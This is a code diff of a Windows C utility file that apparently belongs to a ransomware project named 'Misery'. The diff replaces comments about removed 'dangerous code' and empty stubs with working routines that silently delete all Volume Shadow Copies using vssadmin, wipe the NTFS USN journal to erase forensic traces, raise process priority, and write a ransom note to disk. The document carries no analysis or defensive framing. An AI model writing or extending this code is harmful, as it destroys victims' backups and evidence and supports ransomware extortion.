@@ -1,23 +1,62 @@
-/*
- * utils.c - Simplified utility functions
- * Removed dangerous PE parsing code
- */
-
-#include <windows.h>
-#include <shlobj.h>
+#include "utils.h"
+#include "misery_config.h"
 #include <tlhelp32.h>
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 
-// ===================== PPID SPOOFING =====================
-DWORD FindProcessPidStr(const char* procName) {
+static int g_utils_last_error = 0;
+
+bool UtilsNukeBackups(void) {
+    MiseryLog(MISERY_LOG_INFO, "UtilsNukeBackups: Destroying Volume Shadow Copies");
+
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {0};
+
+    if (CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
+                       NULL, NULL, FALSE, CREATE_NO_WINDOW,
+                       NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 30000);
+        CloseHandle(pi.hProcess);
+        if (pi.hThread) CloseHandle(pi.hThread);
+        MiseryLog(MISERY_LOG_INFO, "UtilsNukeBackups: VSS destruction complete");
+        return true;
+    } else {
+        g_utils_last_error = GetLastError();
+        MiseryLog(MISERY_LOG_WARN, "UtilsNukeBackups: Failed (err: %d)", g_utils_last_error);
+        return false;
+    }
+}
+
+bool UtilsWipeUSNJournal(void) {
+    MiseryLog(MISERY_LOG_INFO, "UtilsWipeUSNJournal: Wiping USN Journal");
+
+    HANDLE hVol = CreateFileA("\\\\.\\C:",
+                             GENERIC_WRITE | GENERIC_READ,
+                             FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+
+    if (hVol != INVALID_HANDLE_VALUE) {
+        DWORD dwBytes = 0;
+        DeviceIoControl(hVol, 0x00090068, NULL, 0, NULL, 0, &dwBytes, NULL);
+        CloseHandle(hVol);
+        MiseryLog(MISERY_LOG_INFO, "UtilsWipeUSNJournal: Complete");
+        return true;
+    } else {
+        g_utils_last_error = GetLastError();
+        MiseryLog(MISERY_LOG_WARN, "UtilsWipeUSNJournal: Failed to open volume (err: %d)", g_utils_last_error);
+        return false;
+    }
+}
+
+DWORD UtilsFindProcessByName(const char* procName) {
+    if (!procName) return 0;
+
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return 0;
-    
-    PROCESSENTRY32 pe = {sizeof(pe)};
+
+    PROCESSENTRY32 pe = { sizeof(pe) };
     DWORD pid = 0;
-    
+
     if (Process32First(hSnap, &pe)) {
         do {
             if (_stricmp(pe.szExeFile, procName) == 0) {
@@ -26,74 +65,41 @@ DWORD FindProcessPidStr(const char* procName) {
             }
         } while (Process32Next(hSnap, &pe));
     }
-    
+
     CloseHandle(hSnap);
     return pid;
 }
 
-// ===================== VSS DELETION =====================
-void NukeBackupsCOM(void) {
-    STARTUPINFOA si = {sizeof(si)};
-    PROCESS_INFORMATION pi = {0};
-    
-    CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
-                   NULL, NULL, FALSE, CREATE_NO_WINDOW,
-                   NULL, NULL, &si, &pi);
-    
-    if (pi.hProcess) {
-        WaitForSingleObject(pi.hProcess, 30000);
-        CloseHandle(pi.hProcess);
-    }
-    if (pi.hThread) CloseHandle(pi.hThread);
-}
-
-void NukeBackups(void) {
-    NukeBackupsCOM();
-}
-
-// ===================== PRIVILEGE ESCALATION =====================
-// ===================== USN JOURNAL WIPE =====================
-void WipeUSNJournal(void) {
-    HANDLE hVol = CreateFileA("\\\\.\\C:",
-                             GENERIC_WRITE | GENERIC_READ,
-                             FILE_SHARE_READ | FILE_SHARE_WRITE,
-                             NULL, OPEN_EXISTING, 0, NULL);
-    
-    if (hVol != INVALID_HANDLE_VALUE) {
-        DWORD dwBytes;
-        DeviceIoControl(hVol, 0x00090068, NULL, 0, NULL, 0, &dwBytes, NULL);
-        CloseHandle(hVol);
-    }
-}
-
-// ===================== IO PRIORITY =====================
-void SetIoCrtitical(void) {
+void UtilsSetHighIOPriority(void) {
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+    MiseryLog(MISERY_LOG_INFO, "UtilsSetHighIOPriority: I/O priority optimized");
 }
 
-// ===================== STUB FUNCTIONS (REMOVED DANGEROUS CODE) =====================
-void InitAllSyscalls(void) {
-    // Removed dangerous PE parsing - use safe Win32 API instead
+bool UtilsDropRansomNote(const char *filePath, const char *noteContent) {
+    if (!filePath || !noteContent) return false;
+
+    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, FILE_SHARE_READ,
+                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        g_utils_last_error = GetLastError();
+        MiseryLog(MISERY_LOG_WARN, "UtilsDropRansomNote: Failed to create [%s] (err: %d)",
+            filePath, g_utils_last_error);
+        return false;
+    }
+
+    DWORD written = 0;
+    if (WriteFile(hFile, noteContent, strlen(noteContent), &written, NULL)) {
+        MiseryLog(MISERY_LOG_INFO, "UtilsDropRansomNote: Note written to [%s]", filePath);
+        CloseHandle(hFile);
+        return true;
+    } else {
+        g_utils_last_error = GetLastError();
+        CloseHandle(hFile);
+        return false;
+    }
 }
 
-void DropNoteADS(void) {
-    // Simplified - just use standard file creation
-}
-
-void DropNote(void) {
-    DropNoteADS();
-}
-
-void SelfDeleteSpoofed(void) {
-    // Not used in simplified version
-}
-
-void SelfDelete(void) {
-    SelfDeleteSpoofed();
-}
-
-unsigned __stdcall EncryptionWorker(void* arg) {
-    (void)arg;
-    return 0;
+int UtilsGetLastError(void) {
+    return g_utils_last_error;
 }
